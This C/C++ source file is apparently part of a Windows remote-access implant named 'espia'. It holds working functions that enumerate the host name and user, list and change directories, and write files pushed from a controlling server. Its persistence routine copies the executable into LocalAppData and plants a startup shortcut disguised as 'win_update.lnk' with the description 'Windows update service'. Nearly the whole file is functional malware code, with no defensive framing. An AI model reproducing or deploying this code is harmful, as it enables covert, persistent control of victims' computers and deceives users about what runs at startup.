#include "includes/espia_comms.h"
#include "includes/espia_func.h"

void whoami(LPWSTR buffer, INT size_buffer) {
    /* Get and append the Hostname */
    DWORD size_comp = size_buffer;
    if (GetComputerNameW(buffer, &size_comp) == 0) {
        Debug(printf("Failed to retrieve the Computer Name : %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
        size_comp = 8;
    }

    /* Append an '@' symbol */
    StringCbCatW(buffer + size_comp, size_buffer, L"@");
    size_comp++;

    /* Get and append Username */
    DWORD size_usr = size_buffer;
    if (GetUserNameW(buffer + size_comp, &size_usr) == 0) {
        Debug(printf("Failed to retrieve the Username : %d\n", GetLastError()));
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
    StringCbCatW(buffer, size_buffer, L"\n");
}

void pwd(LPWSTR buffer, INT size_buffer) {
    /* Get the current working directory */
    if (GetCurrentDirectoryW(size_buffer, buffer) == 0) {
        Debug(printf("Failed to retrieve the Current working directory: %d\n", GetLastError());)
        StringCbCatW(buffer, size_buffer, L"<failed>");
    }
}

/* 'ls' uses a callback function to handle file/folder output from FindNextFileW() */
void ls(INT (*callback)(PWSTR buffer, INT size_buffer)) {
    /* Get the current working directory and append '*' at the end */
    WCHAR temp_dir[MAX_PATH + 1] = L"";
    pwd(temp_dir, sizeof(temp_dir));
    StringCbCatW(temp_dir, sizeof(temp_dir), L"\\*");

    /* Get the file handler for current working dir */
    WIN32_FIND_DATAW file_data;
    HANDLE file_handle;
    if ((file_handle = FindFirstFileW(temp_dir, &file_data)) == INVALID_HANDLE_VALUE) {
        Debug(printf("FindFirstFileW() failed: %d\n", GetLastError());)
        return;
    }
    memset(temp_dir, 0, sizeof(temp_dir));

    /* Iterate over files/folders */
    LARGE_INTEGER filesize;
    do {
        /* If current file/folder is a directory */
        if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t<DIR>\n", file_data.cFileName);
        } 
        /* Else, a file */
        else {
            filesize.LowPart = file_data.nFileSizeLow;
            filesize.HighPart = file_data.nFileSizeHigh;
            StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
        }

        (*callback)(temp_dir, wcslen(temp_dir)*sizeof(WCHAR));                                         // Call the callback function to handle output
    } while (FindNextFileW(file_handle, &file_data) != 0);
}

INT cd(PWSTR path, PWSTR buffer, INT size_buffer) {
    if (SetCurrentDirectoryW(path) == 0) {
        Debug(printf("Changing directory failed: %d\n", GetLastError());)
        StringCbPrintfW(buffer, size_buffer, L"Changing directory failed: %d\n", GetLastError());
        return CD_ERROR;
    }
    return ESPIA_OK;
}

INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buffer), INT (*output_stream)(PWSTR buffer, INT size_buffer)) {
    WCHAR comm_buff[9] = L"\0";
    CHAR file_recv_buff[1024] = "\0";
    if ((*input_stream)(file_recv_buff, sizeof(file_recv_buff)) < 0) {
        Debug(printf("Recieving failed\n");)
        return FILE_CREATION_FAIL;
    }

    /* Converts the file size to int */
    int sum = 0, dig = 0, pow = wcslen((PWSTR)file_recv_buff) - 1;
    for (int i = 0 ; i < wcslen((PWSTR)file_recv_buff) ; i++) {
        dig = *(((PWSTR)file_recv_buff) + i) - L'0';
        for (int j = 0 ; j < pow ; j++)
            dig *= 10;
        sum += dig;
        pow--;
    }

    /* Create the file */
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {                            // If failed. Notify the server.
        StringCbCatW(comm_buff, sizeof(comm_buff), L"den<end>");
        (*output_stream)(comm_buff, sizeof(comm_buff));
        return FILE_CREATION_FAIL;
    }
    StringCbCatW(comm_buff, sizeof(comm_buff), L"ack<end>");        // Else continue
    (*output_stream)(comm_buff, sizeof(comm_buff));

    /* Recieve and write */
    int recieved_bytes = 0, full_bytes = 0;
    memset(file_recv_buff, 0, sizeof(file_recv_buff));
    while (full_bytes != sum) {
        recieved_bytes = (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
        if (recieved_bytes < 0) {
            Debug(printf("Recieveing failed\n");)
            return FILE_CREATION_FAIL;
        }
        if (WriteFile(hFile, file_recv_buff, recieved_bytes, NULL, nullptr) == 0) {
            Debug(printf("Write failed\n");)
            return FILE_CREATION_FAIL;
        }
        full_bytes += recieved_bytes;
    }

    /* Close the handle */
    CloseHandle(hFile);
    return 0;
}

INT persist() {
    
    PWSTR appdata_path = NULL;
    if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &appdata_path) != S_OK) {
        Debug(printf("Getting startup folder path error.");)
        return -1;
    }

    PWSTR startup_path = NULL;
    if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &startup_path) != S_OK) {
        Debug(printf("Getting startup folder path error.");)
            return -1;
    }

    WCHAR file_path[MAX_PATH] = L"\0";
    if (GetModuleFileNameW(NULL, file_path, MAX_PATH) == 0) {
        Debug(printf("Getting module name error.\n");)
        return -1;
    }

    WCHAR file_name[MAX_PATH] = L"\0";
    if (GetFileTitleW(file_path, file_name, MAX_PATH) != 0) {
        Debug(printf("Getting file name error.\n");)
        return -1;
    }

    WCHAR appdata_file[MAX_PATH] = L"\0";
    StringCbCatW(appdata_file, sizeof(appdata_file), appdata_path);      
    StringCbCatW(appdata_file, sizeof(appdata_file), L"\\");   
    StringCbCatW(appdata_file, sizeof(appdata_file), file_name);

    WCHAR startup_file[MAX_PATH] = L"\0";
    StringCbCatW(startup_file, sizeof(startup_file), startup_path);
    StringCbCatW(startup_file, sizeof(startup_file), L"\\");
    StringCbCatW(startup_file, sizeof(startup_file), L"win_update.lnk");

    if (!PathFileExistsW(appdata_file)) {
        Debug(printf("Source path: %ls\nDestination path: %ls\n", file_path, appdata_file);)
        if (CopyFileW(file_path, appdata_file, TRUE) == 0) {
            Debug(printf("Copying failed %d\n", GetLastError());)
            return -1;
        }
    }

    Debug(printf("Source path: %ls\nLink path: %ls\n", appdata_file, startup_file);)

    if (CreateLink(appdata_file, startup_file, L"Windows update service") != S_OK) {
        Debug(printf("Creating link failed\n");)
        return -1;
    }

    return 0;
}

HRESULT CreateLink(LPCWSTR lpszPathObj, LPCWSTR lpszPathLink, LPCWSTR lpszDesc)
{
    HRESULT hres;
    IShellLink* psl;

    // Get a pointer to the IShellLink interface. It is assumed that CoInitialize
    // has already been called.
    CoInitialize(NULL);
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile* ppf;

        // Set the path to the shortcut target and add the description. 
        psl->SetPath(lpszPathObj);
        psl->SetDescription(lpszDesc);

        // Query IShellLink for the IPersistFile interface, used for saving the 
        // shortcut in persistent storage. 
        hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

        if (SUCCEEDED(hres))
        {
            // Save the link by calling IPersistFile::Save. 
            hres = ppf->Save(lpszPathLink, TRUE);
            ppf->Release();
        }

        psl->Release();
    }
    return hres;
}

